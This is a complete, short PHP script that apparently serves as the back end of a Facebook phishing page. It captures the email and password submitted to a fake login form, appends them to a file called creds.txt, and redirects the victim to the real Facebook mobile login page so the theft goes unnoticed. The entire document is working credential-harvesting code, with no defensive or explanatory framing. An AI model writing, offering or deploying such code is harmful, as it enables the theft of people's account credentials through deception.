<?php
file_put_contents("creds.txt", "Email: " . $_POST['email'] . " | Password: " . $_POST['password'] . "\n", FILE_APPEND);
header("Location: https://m.facebook.com/login/");
exit();
?>
